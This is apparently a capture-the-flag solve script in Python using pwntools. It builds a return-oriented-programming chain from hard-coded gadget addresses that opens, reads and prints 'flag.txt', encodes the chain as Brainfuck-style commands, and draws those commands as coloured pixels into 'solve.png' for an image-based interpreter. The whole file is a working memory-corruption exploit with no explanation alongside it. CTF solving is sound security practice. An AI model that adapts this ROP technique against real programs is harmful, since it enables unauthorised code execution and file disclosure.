from pwn import *
from PIL import Image

pop_rax_ret = 0x45cd07 # pop rax; ret;
pop_rdi_ret = 0x4018da # pop rdi; ret;
pop_rsi_ret = 0x402a38 # pop rsi; ret;
pop_rdx_ret = 0x4017df # pop rdx; ret;
syscall_ret = 0x426194 # syscall; ret;
bss_addr    = 0x4e4b20
exit_addr   = 0x411210

buf0  = "z"+"0"*8*22+"flag.txt0"

buf1  = ">"*120+","+"+"*(0xda-0x7a)
buf1 += ">"+"-"*8
buf1 += ">"*7+"+"*(0x128-0xb8)
buf1 += ">"
buf1 += ">"*6

buf2  = p64(pop_rax_ret)
buf2 += p64(2)
buf2 += p64(pop_rsi_ret)
buf2 += p64(0)
buf2 += p64(pop_rdx_ret)
buf2 += p64(0)
buf2 += p64(syscall_ret)
buf2 += p64(pop_rax_ret)
buf2 += p64(0)
buf2 += p64(pop_rdi_ret)
buf2 += p64(3)
buf2 += p64(pop_rsi_ret)
buf2 += p64(bss_addr)
buf2 += p64(pop_rdx_ret)
buf2 += p64(0x100)
buf2 += p64(syscall_ret)
buf2 += p64(pop_rax_ret)
buf2 += p64(1)
buf2 += p64(pop_rdi_ret)
buf2 += p64(1)
buf2 += p64(syscall_ret)
buf2 += p64(exit_addr)
buf3 = ""
for i in range(len(buf2)):
  if int(buf2[i]) == 0x30:
    buf3 += ">,"
  if int(buf2[i]) > 0x30:
    buf3 += ">," + "+"*(int(buf2[i]) - 0x30)
  else:
    buf3 += ">," + "-"*(0x30 - int(buf2[i]))
buf3 += ">,"*9+"-"*0x30

buf4 = buf1+buf3

print(buf0)
print(buf4)

print(len(buf4))

im = Image.new('RGB', (98,98))
rgb_im = im.convert('RGB')
i = 0
for y in range(98):
  for x in range(98):
    if buf4[i] == ">":
      r = 255
      g = 0
      b = 0 
    if buf4[i] == ".":
      r = 0
      g = 255
      b = 0
    if buf4[i] == "<":
      r = 0
      g = 0
      b = 255
    if buf4[i] == "+":
      r = 255
      g = 255
      b = 0
    if buf4[i] == "-":
      r = 0
      g = 255
      b = 255
    if buf4[i] == "[":
      r = 255
      g = 0
      b = 188
    if buf4[i] == "]":
      r = 255
      g = 128
      b = 0
    if buf4[i] == ",":
      r = 102
      g = 0
      b = 204       
    im.putpixel((x,y),(r,g,b))
    i += 1
    if i >= len(buf4)-1:
      break    
im.save('solve.png')
    
